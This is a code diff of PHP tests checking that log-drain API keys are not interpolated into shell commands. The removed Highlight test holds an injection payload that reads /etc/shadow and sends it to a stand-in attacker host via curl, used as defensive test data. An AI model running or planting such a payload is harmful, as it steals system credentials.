@@ -17,7 +17,6 @@ it('does not interpolate axiom api key into shell commands', function () {
 
     $settings->is_logdrain_axiom_enabled = true;
     $settings->is_logdrain_newrelic_enabled = false;
-    $settings->is_logdrain_highlight_enabled = false;
     $settings->is_logdrain_custom_enabled = false;
     $settings->logdrain_axiom_dataset_name = 'test-dataset';
     $settings->logdrain_axiom_api_key = $maliciousPayload;
@@ -48,15 +47,6 @@ it('does not interpolate newrelic license key into shell commands', function () 
 
     $decoded = base64_decode($envEncoded);
     expect($decoded)->toContain("LICENSE_KEY={$maliciousPayload}");
-});
-
-it('does not interpolate highlight project id into shell commands', function () {
-    $maliciousPayload = '$(curl attacker.com/steal?key=$(cat /etc/shadow))';
-
-    $envContent = "HIGHLIGHT_PROJECT_ID={$maliciousPayload}\n";
-    $envEncoded = base64_encode($envContent);
-
-    expect($envEncoded)->not->toContain($maliciousPayload);
 });
 
 it('produces correct env file content for axiom type', function () {
